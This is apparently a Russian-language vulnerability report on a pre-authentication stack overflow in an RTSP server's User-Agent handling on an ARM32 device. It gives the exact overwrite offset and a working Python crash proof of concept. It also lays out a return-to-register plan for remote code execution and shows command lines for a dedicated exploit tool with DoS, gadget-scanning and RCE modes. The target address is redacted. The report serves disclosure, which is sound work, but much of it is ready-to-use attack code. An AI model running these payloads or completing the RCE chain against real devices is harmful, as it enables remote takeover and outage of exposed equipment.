# [UA] RTSP User-Agent Stack Overflow

**CWE-121** · **CVSS 9.8 Critical** · **Pre-auth** · **Remote**

---

## Краткое описание

Функция обработки RTSP-запросов копирует значение заголовка `User-Agent` в стековый буфер фиксированного размера через `strcpy()` без проверки длины. Переполнение позволяет перезаписать сохранённый PC и перенаправить исполнение на произвольный адрес.

---

## Технические детали

### Уязвимая функция

```c
// Псевдокод (восстановлен по поведению, без дизассемблера)
char ua_buf[102];               // стековый буфер
strcpy(ua_buf, user_agent);     // уязвимая копия — нет проверки длины
```

### Стек-лейаут (подтверждён экспериментально)

```
Смещение   Содержимое
─────────────────────────────────────────────────────
[0   – 101]   ua_buf     (102 байта — strcpy destination)
[102 – 215]   locals     (114 байт — локальные переменные функции)
[216 – 247]   R4–R11     (32 байта — 8 сохранённых регистров AAPCS)
[248 – 251]   saved PC   ← PC_OFFSET = 248  ★ контроль исполнения
─────────────────────────────────────────────────────
```

### Null-byte constraint

`strcpy()` останавливается на первом байте `0x00`. Следствия:
- Байты `[0–101]` ua_buf — все ненулевые
- Байты `[102–247]` filler — все ненулевые
- Байты `[248–251]` адрес возврата — все 4 байта ненулевые

Адреса с нулевым байтом (например `0x40001234` → `\x34\x12\x00\x40`) **недостижимы**.

---

## Доказательство (PoC)

### Минимальный DoS

```python
import socket

TARGET = "█████████████"
payload = b'A' * 248 + b'\xEF\xBE\xAD\xDE'   # PC = 0xDEADBEEF (kernel space)
req = (b"DESCRIBE rtsp://█████████████:554/live RTSP/1.0\r\n"
       b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")

s = socket.socket(); s.settimeout(5)
s.connect((TARGET, 554)); s.sendall(req); s.close()
# → kernel panic (0xDEADBEEF > 0xC0000000) → reboot за ~74s
# → для быстрого DoS (2.5s): используй null-free адрес в mmap-регионе
```

### Подтверждение PC_OFFSET (De Bruijn)

```python
import pwn
pattern = pwn.cyclic(300)   # null-free последовательность
# После краша: PC = cyclic value → offset = pwn.cyclic_find(PC_value)
# Результат: PC_OFFSET = 248
```

---

## Oracle-тайминг

| Payload | Recovery | Интерпретация |
|---------|----------|---------------|
| `'A' * 248 + null-free addr` | ~2.5 сек | Crash в mapped region, watchdog |
| `'A' * 248 + 0xDEADBEEF` | ~74 сек | Kernel panic, полная перезагрузка |
| LOOP_SC + ... + BX_R0_addr | >20 сек (нет рестарта) | Shellcode loop крутится = **RCE** |

---

## RCE вектор (ret2reg)

После `strcpy(ua_buf, value)`, регистр `R0` по AAPCS = возвращаемое значение = первый аргумент = `ua_buf`.

Если прыгнуть на гаджет `BX R0` (`\x10\xff\x2f\xe1`):
```
CPU: PC ← gadget_addr → выполняет BX R0 → PC ← R0 = ua_buf → shellcode
```

Shellcode в ua_buf — 102 null-free байта ARM32.

Статус: **гаджет не найден** (117 из ~938 кандидатов проверено, ~1% покрытия).

---

## Затронутые компоненты

```
RTSP parser → User-Agent handler → strcpy → stack smash → PC control
Запрос: DESCRIBE rtsp://<host>:554/live RTSP/1.0
        User-Agent: <payload>
```

---

## CVSS v3.1

```
AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H  =  9.8 Critical
```

---

## Эксплойт

```bash
python3 exploits/crashbandicoot.py -t █████████████ --mode dos-ua
python3 exploits/crashbandicoot.py -t █████████████ --mode scan-bxr0
python3 exploits/crashbandicoot.py -t █████████████ --mode rce --gadget 0xXXXXXXXX
```


---

*Co-authored with [Claude](https://claude.ai) (Anthropic)*
